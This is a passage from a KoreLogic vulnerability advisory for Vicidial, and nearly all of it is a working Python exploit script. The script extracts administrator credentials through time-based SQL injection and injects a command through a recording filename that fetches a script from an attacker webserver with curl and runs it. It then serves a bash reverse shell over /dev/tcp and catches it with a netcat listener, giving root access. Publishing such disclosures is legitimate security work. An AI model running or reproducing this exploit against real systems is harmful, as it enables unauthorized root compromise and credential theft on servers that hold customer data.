"LOGINvarFIVE":"","hide\_relogin\_fields":"","VD\_login":username,"VD\_pass":password,
"MGR\_override":"1","relogin":"YES","VD\_login":username,"VD\_pass":password,
"MGR\_login20240530":username,"MGR\_pass20240530":password,"SUBMIT":"SUBMIT"
}
response = session.post(f'{self.base\_uri}/agc/vicidial.php', headers=request\_headers, data=manager\_login\_body)
print(f'[+] Entered "manager" credentials to override shift enforcement')
agent\_login\_body = {
"DB":"0","JS\_browser\_height":"1313","JS\_browser\_width":"2560","admin\_test":"","LOGINvarONE":"",
"LOGINvarTWO":"","LOGINvarTHREE":"","LOGINvarFOUR":"","LOGINvarFIVE":"","phone\_login":phone\_extension,
"phone\_pass":phone\_password,"VD\_login":username,"VD\_pass":password,"VD\_campaign":"313373",
}
response = session.post(f'{self.base\_uri}/agc/vicidial.php', headers=request\_headers, data=agent\_login\_body)
print(f'[+] Authenticated as agent using phone credentials')
# insert malicious recording
session\_name = re.findall(r"var session\_name = '([a-zA-Z0-9\_]+?)';", response.text)[0]
session\_id = re.findall(r"var session\_id = '([0-9]+?)';", response.text)[0]
malicious\_filename = f"3133731337$(curl$IFS@{self.PAYLOAD\_WEBSERVER\_HOST}:{self.PAYLOAD\_WEBSERVER\_PORT}$IFS-o$IFS.c&&bash$IFS.c)"
record1\_body = {
"server\_ip":self.TARGET\_IP,"session\_name":session\_name,"user":username,"pass":password,
"ACTION":"MonitorConf","format":"text","channel":f"Local/{recording\_extension}@default","filename":malicious\_filename,
"exten":recording\_extension,"ext\_context":"default","lead\_id":"","ext\_priority":"1","FROMvdc":"YES",
"uniqueid":"","FROMapi":""
}
response = session.post(f'{self.base\_uri}/agc/manager\_send.php', headers=request\_headers, data=record1\_body)
recording\_id = re.findall(r'RecorDing\_ID: ([0-9]+)', response.text)[0]
# stop malicious recording to prevent file size from growing
record2\_body = {
"server\_ip":self.TARGET\_IP,"session\_name":session\_name,"user":username,
"pass":password,"ACTION":"StopMonitorConf","format":"text","channel":f"Local/{recording\_extension}@default",
"filename":f"ID:{recording\_id}","exten":session\_id,"ext\_context":"default","lead\_id":"","ext\_priority":"1",
"FROMvdc":"YES","uniqueid":"","FROMapi":""
}
response = session.post(f'{self.base\_uri}/agc/conf\_exten\_check.php', headers=request\_headers, data=record2\_body)
# returns administrator username and password by
# exploiting time-based SQL injection.
def extract\_admin\_credentials(self, session):
print('[~] Enumerating administrator credentials')
username\_charset = string.ascii\_letters + string.digits
admin\_username\_query = "SELECT user FROM vicidial\_users WHERE user\_level = 9 AND modify\_same\_user\_level = '1' LIMIT 1"
admin\_username = self.enumerate\_sql\_query(session, admin\_username\_query, username\_charset)
print(f'[+] Username: {admin\_username}')
password\_charset = string.ascii\_letters + string.digits + '-.+/=\_'
admin\_password\_query = f"SELECT pass FROM vicidial\_users WHERE user = '{admin\_username}' LIMIT 1"
admin\_password = self.enumerate\_sql\_query(session, admin\_password\_query, password\_charset)
print(f'[+] Password: {admin\_password}')
return admin\_username, admin\_password
# emulates a webserver to deliver exploit script
def payload\_webserver(self):
server = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
server.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
server.bind((self.PAYLOAD\_WEBSERVER\_HOST, int(self.PAYLOAD\_WEBSERVER\_PORT)))
server.listen(1)
while True:
client, incoming\_address = server.accept()
message = client.recv(100)
if b'User-Agent: curl' in message:
break
else:
client.close()
print(f'[+] Received cURL request from {incoming\_address[0]}')
exploit\_script = f"#!/bin/bash\nbash -i >& /dev/tcp/{self.REVERSE\_SHELL\_HOST}/{self.REVERSE\_SHELL\_PORT} 0>&1"
http\_response = f"HTTP/1.1 200 OK\r\n"
http\_response += f"Content-Length: {len(exploit\_script)}\r\n\r\n"
http\_response += exploit\_script
client.sendall(http\_response.encode())
client.close()
# starts a netcat process to catch the incoming reverse shell
def netcat\_listener(self):
os.system(f'nc -nlvs {self.REVERSE\_SHELL\_HOST} -p {self.REVERSE\_SHELL\_PORT}')
# binds to provided addresses and handles incoming connections
def prepare\_listeners(self):
webserver = threading.Thread(target=self.payload\_webserver)
netcat = threading.Thread(target=self.netcat\_listener)
print('[~] Listening for incoming connections...')
netcat.start()
webserver.start()
# establish a reverse shell as root from the vicidial instance
def shell(self):
session = self.build\_requests\_session()
is\_vulnerable = self.is\_vulnerable(session)
if is\_vulnerable:
print('[+] Target appears vulnerable to time-based SQL injection')
else:
print('[-] Failed to perform time-based SQL injection')
return
username, password = self.extract\_admin\_credentials(session)
self.poison\_recording\_files(session, username, password)
# prepare exploit listeners if configured
if self.BIND: self.prepare\_listeners()
if \_\_name\_\_ == '\_\_main\_\_':
argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi to RCE as root')
required = argparser.add\_argument\_group('Required Arguments')
optional = argparser.add\_argument\_group('Optional Arguments')
required.add\_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
required.add\_argument('-rp', '--rport', required=True, help='Vicidial Server port number')
required.add\_argument('-wh', '--whost', required=True, help='Malicious webserver IP address')
required.add\_argument('-wp', '--wport', required=True, help='Malicious webserver port number')
required.add\_argument('-lh', '--lhost', required=False, help='Reverse shell listener IP address')
required.add\_argument('-lp', '--lport', required=False, help='Reverse shell listener port number')
optional.add\_argument('-b', '--bind', required=False, help='Bind to [lhost:lport] and [whost:wport] and handle connections automatically', action='store\_true', default=False)
optional.add\_argument('-p', '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests', default=None)
arguments = argparser.parse\_args()
exploit = Exploit(
rhost = arguments.rhost,
rport = arguments.rport,
whost = arguments.whost,
wport = arguments.wport,
lhost = arguments.lhost,
lport = arguments.lport,
bind = arguments.bind,
proxy = arguments.proxy
)
exploit.shell()
The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCAA4FiEEB12WYZwbVwYTJ/b2DKLsCTlWkekFAmbgmb8aHGRpc2Nsb3N1
cmVzQGtvcmVsb2dpYy5jb20ACgkQDKLsCTlWkel6bQ/8DXRaVDMQUEv6YilGkiJC
+sar3UxTgMlvkt8uLH/3qXLAf1KhLTxZ2GWQdpvQ7HDqauHqQNglyHgCQyj678AJ
Hcg560KGfplziyPa6du1Av42eSuK2QM+7M2UOg2Bh3OhT6sPUZyTLqRCQ6RU7Mxa
UvqkamWscehk6BvIwGvStNLT0AxYtSh6fKnndIcAlgfqQWSkQv5bDpEU8gOu1qkO
MLIkUCXVGohlyyr8IcJlA2HF5yd+CHB0+lxr/UHu0UOJAPPDjmBkuuivCGznK8US
GmWrAwP8ICYdKxwEJec8suHocHeCMbFicce5X4frCDXPV4jGWksZDNVdrUdZm8wJ
mo3CrsRE1S7RjmCRVPHZXxDGZrv8HDXC2IQXMLTIMDe0ZNHzmyDC03XEqQRF5YUI
YWp+KbJ8MUhyUxjqO7vmRoA65x5Ckjy2u+R3Mzu8byuLSRvCXWsyGa/CSemUu/bj
eBLwiN1/3CgKmeuHKNKeJghzzm3nbQt6XrrOEW6dGYw1EZd+OeD6VIZWf+/bWWuG
awZ/uikI3RG5Lb3XGiu5oWAXiTyuNg3yjCS/47QczROyfnQPXrBcPsl2ksrSlnt6
80R/zYUZOj9uebMDQ+PGl0qgh1LL7YXI/ZOv1H8AObQAHIvihLzb2312r1i+b3e/
j+B0eX1DflHH1z4Co/NYtzw=
=v44I
-----END PGP SIGNATURE-----

